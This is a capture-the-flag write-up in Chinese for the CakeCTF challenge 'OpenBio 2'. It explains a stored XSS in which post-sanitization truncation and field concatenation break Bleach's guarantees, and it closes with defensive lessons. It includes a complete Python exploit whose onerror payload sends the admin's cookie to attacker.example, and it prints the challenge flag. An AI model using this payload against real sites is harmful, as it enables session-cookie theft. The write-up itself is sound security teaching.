# OpenBio 2

## 题目简述

题目提供一个个人简介提交页。服务端保存 `name`、`email`、`bio1` 和 `bio2`，访问 `/bio/<id>` 时分别处理两个简介字段：

```python
bio1 = bleach.linkify(bleach.clean(bio['bio1'], strip=True))[:10000]
bio2 = bleach.linkify(bleach.clean(bio['bio2'], strip=True))[:10000]
```

模板随后把两个结果无分隔地放进同一个 HTML 上下文：

```html
<div id="bio">{{ bio1 | safe }}{{ bio2 | safe }}</div>
```

题目另有 report 与 Puppeteer crawler。管理员浏览器访问被举报的 `/bio/<id>` 前会设置可由 JavaScript 读取的 `flag` Cookie，所以目标是构造存储型 XSS 并外带 Cookie。

漏洞并不是直接绕过 `bleach.clean`，而是程序在清洗和链接化完成后又执行字符串截断，再把两个独立处理的片段拼接起来。后置变换破坏了清洗器保证的 HTML 完整性。

## 解题过程

`bio1` 和 `bio2` 的原始输入各自最多 1001 个字符。`linkify` 会把短域名扩展成完整链接，例如把 `a.jp` 转成包含 `href`、`rel`、正文和闭合标签的 `<a>` 元素；此前的 `clean` 还会把分隔字符 `&` 扩展为 `&amp;`。因此短输入经过两步处理后可以膨胀十倍以上，超过后面的 10000 字符截断线。

官方解法使用：

```python
bio1 = '<<' + '&'.join(['a.jp'] * 200)
bio2 = f'''img src=x onerror="eval(atob('{payload}'))"'''
```

`bio1` 的长度恰好是 1001。前缀和重复次数把切点校准到某个 `</a>` 的首字符：完整输出本来仍是 Bleach 认可的安全链接序列，`[:10000]` 却把它截成以裸露 `<` 结尾的片段。`bio2` 单独接受清洗时没有起始 `<`，所以 `img src=... onerror=...` 只是普通文本；模板相邻拼接后，两段组合为一个真实标签：

```html
...a.jp<img src=x onerror="eval(atob('...'))"
```

浏览器会补全这个畸形 `<img>`。由于 `src=x` 加载失败，`onerror` 执行 Base64 编码的 JavaScript。攻击代码只需在 Cookie 非空时导航到监听地址：

```python
import base64
import os
import requests

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 8011))
PWN_HOST = os.getenv("PWN_HOST", "attacker.example")
PWN_PORT = int(os.getenv("PWN_PORT", 18001))

url = f"http://{HOST}:{PORT}"
js = (
    f"if(document.cookie)"
    f"location.href='http://{PWN_HOST}:{PWN_PORT}/?a='+document.cookie"
)
payload = base64.b64encode(js.encode()).decode()

bio1 = '<<' + '&'.join(['a.jp'] * 200)
bio2 = f'''img src=x onerror="eval(atob('{payload}'))"'''

r = requests.post(url, allow_redirects=False, data={
    "name": "a",
    "email": "",
    "bio1": bio1,
    "bio2": bio2,
})
print(r.headers["Location"])
```

取得 `/bio/<id>` 后，将该 id 提交到 report 服务。Crawler 带着 flag Cookie 打开页面，触发 `onerror`，监听端收到 `?a=flag=...`。最终 flag 为：

```text
CakeCTF{d0n'7_m0d1fy_4ft3r_s4n1tiz3}
```

参赛者的[逐步复现记录](https://qiita.com/kusano_k/items/697ad6886d9c1712a7b4)也验证了“链接膨胀、10000 字符截断、跨字段补全标签”这三个关键环节；正文已完整转述其必要信息，外链仅作为运行时旁证。

## 方法总结

- 核心技巧：利用 `linkify` 放大文本，让安全处理后的截断恰好生成 `<`，再借相邻字段补全事件处理器标签。
- 识别信号：任何“先清洗，后截断、拼接或替换”的流程都可能破坏清洗器给出的完整性保证；两个分别安全的片段在同一 HTML 上下文拼接后也未必安全。
- 复用要点：安全过滤应是输出前最后一次结构性变换。若业务必须限制长度，应在原始文本阶段截断，或在所有拼接与截断完成后重新解析并清洗最终 HTML。
